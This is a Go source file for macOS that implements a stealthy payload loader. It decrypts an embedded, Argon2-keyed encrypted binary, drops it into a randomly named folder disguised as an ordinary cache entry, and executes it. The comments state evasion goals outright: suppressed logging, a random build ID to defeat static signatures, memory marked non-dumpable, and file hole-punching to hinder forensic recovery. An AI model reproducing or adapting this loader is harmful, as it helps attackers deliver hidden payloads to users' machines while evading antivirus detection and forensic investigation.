//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/subtle"
	_ "embed"
	"fmt"
	"io"
	"math/big"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"github.com/fxamacker/cbor/v2"
	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/twofish"
)

// stealthLogger is a minimal logger that doesn't write to system.log
type stealthLogger struct {
	enabled bool
}

// logf prints a message only if logging is enabled, obfuscating paths
func (s *stealthLogger) logf(format string, args ...interface{}) {
	if s.enabled {
		// Obfuscate any paths in the message to avoid revealing actual locations
		msg := fmt.Sprintf(format, args...)

		// Replace any paths with [REDACTED_PATH]
		if strings.Contains(msg, "/") {
			// Check if this looks like a path message
			if strings.Contains(msg, "path") || strings.Contains(msg, "file") ||
				strings.Contains(msg, "directory") || strings.Contains(msg, "executing") {
				// Replace the actual path with a placeholder
				msg = "[*] " + strings.Split(msg, ":")[0] + " [REDACTED_PATH]"
			}
		}

		// In production, don't output anything
		// In debug mode, could write to a secure location
		_ = msg
	}
}

// fatal logs a message and exits without writing to system.log
func (s *stealthLogger) fatal(format string, args ...interface{}) {
	// Just exit without logging
	os.Exit(1)
}

// Create a global logger instance
var logger = &stealthLogger{enabled: false}

// buildTimeRandomID is a random ID generated at build time
// This will be replaced during the build process with a random value
// to avoid static signatures
var buildTimeRandomID = "RANDOM_ID_PLACEHOLDER"

//go:embed payload.cbor
var payloadData []byte

// Default Argon2 parameters
const (
	argonTime    uint32 = 1
	argonMemory  uint32 = 64 * 1024
	argonThreads uint8  = 4
	argonKeyLen  uint32 = chacha20poly1305.KeySize
)

// Architecture constants
const (
	archARM64  = 1
	archX86_64 = 2

	// macOS specific syscall numbers
	SYS_MADVISE = 75 // macOS specific syscall number
)

// PayloadData represents the structure of our CBOR payload
type PayloadData struct {
	EncryptedBytes []byte `cbor:"encrypted"`
	Password       []byte `cbor:"password"`
	Salt           []byte `cbor:"salt"`
	Nonce          []byte `cbor:"nonce"`
	Alg            string `cbor:"alg"`
	Compressed     bool   `cbor:"compressed,omitempty"` // Flag to indicate if data is compressed
	ArgonParams    struct {
		Time    uint32 `cbor:"time"`
		Memory  uint32 `cbor:"memory"`
		Threads uint8  `cbor:"threads"`
	} `cbor:"argon_params"`
}

func main() {
	// Check if running on supported architecture
	arch, err := detectArchitecture()
	if err != nil {
		logger.fatal("Failed to detect architecture: %v", err)
	}

	// Decrypt the embedded Mach-O binary
	machoBytes, err := decryptFile()
	if err != nil {
		logger.fatal("Failed to decrypt file: %v", err)
	}

	// Lock memory to prevent swapping and core dumps
	// Convert slice to []byte for Mlock
	if err := syscall.Mlock(machoBytes); err != nil {
		logger.logf("Warning: Failed to lock memory: %v", err)
	}

	// Note: macOS doesn't support MADV_DONTDUMP directly
	// We'll use MADV_NOCORE which is the macOS equivalent
	// But we need to use the raw syscall since it's not exposed in Go's syscall package
	const MADV_NOCORE = 5 // macOS specific
	_, _, errno := syscall.Syscall(SYS_MADVISE,
		uintptr(unsafe.Pointer(&machoBytes[0])),
		uintptr(len(machoBytes)),
		uintptr(MADV_NOCORE))
	if errno != 0 {
		logger.logf("Warning: Failed to mark memory as not dumpable: %v", errno)
	}

	// Execute the decrypted Mach-O binary
	executeMachO(machoBytes, arch)

	// This point is only reached if execution fails
	// Ensure memory is securely wiped
	secureWipe(machoBytes)
	runtime.KeepAlive(machoBytes) // Prevent optimization from removing the wipe
}

func decryptFile() ([]byte, error) {
	// Unmarshal CBOR payload
	var payload PayloadData
	if err := cbor.Unmarshal(payloadData, &payload); err != nil {
		return nil, fmt.Errorf("failed to unmarshal payload: %v", err)
	}

	// Use the embedded Argon2 parameters or fall back to defaults
	timeParam := argonTime
	memoryParam := argonMemory
	threadsParam := argonThreads

	if payload.ArgonParams.Time > 0 {
		timeParam = payload.ArgonParams.Time
	}
	if payload.ArgonParams.Memory > 0 {
		memoryParam = payload.ArgonParams.Memory
	}
	if payload.ArgonParams.Threads > 0 {
		threadsParam = payload.ArgonParams.Threads
	}

	// Derive the key using Argon2id parameters
	key := argon2.IDKey(payload.Password, payload.Salt,
		timeParam, memoryParam, threadsParam, argonKeyLen)

	var aead cipher.AEAD
	switch strings.ToLower(payload.Alg) {
	case "aesgcm", "aes":
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create AES-GCM AEAD: %v", err)
		}
	case "twofish":
		block, err := twofish.NewCipher(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish cipher: %v", err)
		}
		aead, err = cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("failed to create Twofish-GCM AEAD: %v", err)
		}
	default:
		var err error
		aead, err = chacha20poly1305.New(key)
		if err != nil {
			return nil, fmt.Errorf("failed to create ChaCha20 AEAD: %v", err)
		}
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, payload.Nonce, payload.EncryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	// Check if the data was compressed and decompress if needed
	if payload.Compressed {
		logger.logf("Decompressing payload data")

		// Create a reader for the compressed data
		zr, err := zlib.NewReader(bytes.NewReader(decryptedBytes))
		if err != nil {
			return nil, fmt.Errorf("failed to create decompression reader: %v", err)
		}
		defer zr.Close()

		// Read the decompressed data
		var decompressed bytes.Buffer
		_, err = io.Copy(&decompressed, zr)
		if err != nil {
			return nil, fmt.Errorf("failed to decompress data: %v", err)
		}

		// Replace the decrypted bytes with the decompressed data
		decryptedBytes = decompressed.Bytes()
	}

	return decryptedBytes, nil
}

// generateRandomString creates a random string of specified length
func generateRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result[i] = charset[n.Int64()]
	}
	return string(result), nil
}

// secureWipe overwrites a byte slice with zeros using constant-time operations
func secureWipe(data []byte) {
	// Get pointer to data for constant-time operations
	dataPtr := unsafe.Pointer(&data[0])

	// Create a zero buffer of the same size
	zeros := make([]byte, len(data))

	// Use constant-time copy to prevent optimization
	subtle.ConstantTimeCopy(1, data, zeros)

	// Ensure the wipe isn't optimized away
	runtime.KeepAlive(data)
	runtime.KeepAlive(dataPtr)

	// Use MADV_FREE to immediately reclaim memory pages
	// MADV_FREE = 8 on macOS
	const MADV_FREE = 8
	_, _, _ = syscall.Syscall(SYS_MADVISE,
		uintptr(dataPtr),
		uintptr(len(data)),
		uintptr(MADV_FREE))

	// Force garbage collection
	runtime.GC()
}

// detectArchitecture determines the current CPU architecture
func detectArchitecture() (int, error) {
	// Create buffer to hold the result
	var buf [8]byte
	bufLen := uintptr(8)

	// Name of the sysctl to query
	mib := "hw.optional.arm64"
	mibPtr, err := syscall.BytePtrFromString(mib)
	if err != nil {
		return 0, fmt.Errorf("failed to convert sysctl name to byte pointer: %v", err)
	}

	// Call sysctlbyname to check if ARM64 is supported
	_, _, errno := syscall.Syscall6(
		syscall.SYS___SYSCTL,
		uintptr(unsafe.Pointer(mibPtr)),
		uintptr(len(mib)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufLen)),
		0,
		0,
	)

	if errno != 0 {
		// If syscall fails, assume x86_64 (most common fallback)
		return archX86_64, nil
	}

	// Check the result - if non-zero, we're on ARM64
	if buf[0] != 0 {
		return archARM64, nil
	}

	return archX86_64, nil
}

// getTempPath returns a secure path for temporary files
func getTempPath() (string, error) {
	// Use os.UserCacheDir() to get the user's cache directory
	// This is typically /Users/<username>/Library/Caches on macOS
	// or /private/var/folders/<random>/<random>/C/com.apple.FontRegistry on newer macOS
	userCacheDir, err := os.UserCacheDir()
	if err != nil {
		// If we can't get the user cache dir, try UserTempDir
		userTempDir, err := os.UserHomeDir()
		if err != nil {
			// Last resort, fall back to /tmp
			randomStr, err := generateRandomString(12)
			if err != nil {
				return "", err
			}
			return filepath.Join("/tmp", "."+randomStr), nil
		}

		// Use a hidden folder in the user's home directory
		randomStr, err := generateRandomString(12)
		if err != nil {
			return "", err
		}
		return filepath.Join(userTempDir, ".cache", "."+randomStr), nil
	}

	// Create a random subfolder in the user cache dir to blend in with other cache files
	// Use the build-time random ID if available, otherwise generate one
	var bundlePrefix string
	if buildTimeRandomID != "RANDOM_ID_PLACEHOLDER" {
		bundlePrefix = buildTimeRandomID
	} else {
		randomAppName, err := generateRandomString(8)
		if err != nil {
			// Fall back to a generic name if random generation fails
			bundlePrefix = "cache"
		} else {
			bundlePrefix = randomAppName
		}
	}

	randomStr, err := generateRandomString(12)
	if err != nil {
		return "", err
	}

	// Create a path that looks like a legitimate cache file
	// Using common prefixes that blend with system caches
	legitPrefixes := []string{"com.", "org.", "io.", "net."}
	random, _ := rand.Int(rand.Reader, big.NewInt(int64(len(legitPrefixes))))
	prefix := legitPrefixes[random.Int64()]

	tmpDir := filepath.Join(userCacheDir, prefix+bundlePrefix+".cache")

	// Create the directory if it doesn't exist
	if err := os.MkdirAll(tmpDir, 0700); err != nil {
		// Fall back to user cache dir directly if we can't create the subfolder
		return filepath.Join(userCacheDir, "."+randomStr), nil
	}

	return filepath.Join(tmpDir, randomStr), nil
}

// punchHole overwrites and then punches a hole in a file to make forensic recovery harder
func punchHole(fd int) error {
	// First, overwrite the file with zeros
	var stat syscall.Stat_t
	err := syscall.Fstat(fd, &stat)
	if err != nil {
		return err
	}

	// Get file size from stat
	fileSize := stat.Size

	// Create a buffer of zeros
	zeros := make([]byte, 4096) // Use 4K blocks for efficiency

	// Overwrite the file with zeros
	for offset := int64(0); offset < fileSize; offset += 4096 {
		writeLen := 4096
		if offset+4096 > fileSize {
			writeLen = int(fileSize - offset)
		}

		_, err := syscall.Pwrite(fd, zeros[:writeLen], offset)
		if err != nil {
			return err
		}
	}

	// Sync to ensure writes hit disk
	syscall.Fsync(fd)

	// Now punch a hole in the file using F_PUNCHHOLE
	// Note: This is macOS specific and may not work on all filesystems
	// The constants below are from macOS fcntl.h
	const F_PUNCHHOLE = 99

	// Define the fpunchhole_t structure for macOS
	type fpunchhole_t struct {
		Offset int64
		Length int64
	}

	// Create the punch hole request
	punchHoleReq := fpunchhole_t{
		Offset: 0,
		Length: fileSize,
	}

	// Convert the struct to a pointer
	punchHolePtr := unsafe.Pointer(&punchHoleReq)

	// Try to punch a hole in the entire file using the proper fcntl call
	_, _, errno := syscall.Syscall(
		syscall.SYS_FCNTL,
		uintptr(fd),
		uintptr(F_PUNCHHOLE),
		uintptr(punchHolePtr),
	)

	if errno != 0 {
		return fmt.Errorf("failed to punch hole: %v", errno)
	}

	return nil
}

// executeMachO handles the Mach-O binary execution process
func executeMachO(machoBytes []byte, arch int) {
	// Get a secure temporary path
	tmpPath, err := getTempPath()
	if err != nil {
		logger.fatal("Failed to generate temporary path: %v", err)
	}

	logger.logf("Dropping decrypted binary to: %s", tmpPath)

	// Open the file for writing and later hole punching
	fd, err := syscall.Open(tmpPath, syscall.O_RDWR|syscall.O_CREAT|syscall.O_TRUNC, 0700)
	if err != nil {
		logger.fatal("Failed to create temporary file: %v", err)
	}
	// Ensure file descriptor is always closed
	defer syscall.Close(fd)

	// Write the decrypted Mach-O binary to the file descriptor
	_, err = syscall.Write(fd, machoBytes)
	if err != nil {
		logger.fatal("Failed to write to temporary file: %v", err)
	}

	// Sync to ensure writes hit disk
	syscall.Fsync(fd)

	// Securely wipe the decrypted binary from memory
	logger.logf("Securely wiping binary from memory")
	secureWipe(machoBytes)

	// Verify the file exists and is executable before attempting to execute it
	if _, err := os.Stat(tmpPath); err != nil {
		logger.fatal("Error: File does not exist or cannot be accessed")
	}

	logger.logf("Executing binary")

	// Execute the binary using syscall.Exec which replaces the current process
	err = syscall.Exec(tmpPath, []string{tmpPath}, os.Environ())

	// If we reach here, exec failed
	logger.logf("Exec failed, attempting cleanup")

	// Punch a hole in the file
	if err := punchHole(fd); err != nil {
		logger.logf("Warning: Failed to punch hole in file")
	}

	// Remove the file
	if err := os.Remove(tmpPath); err != nil {
		logger.logf("Warning: Failed to remove temporary file")
	}

	logger.fatal("Failed to execute binary")
}
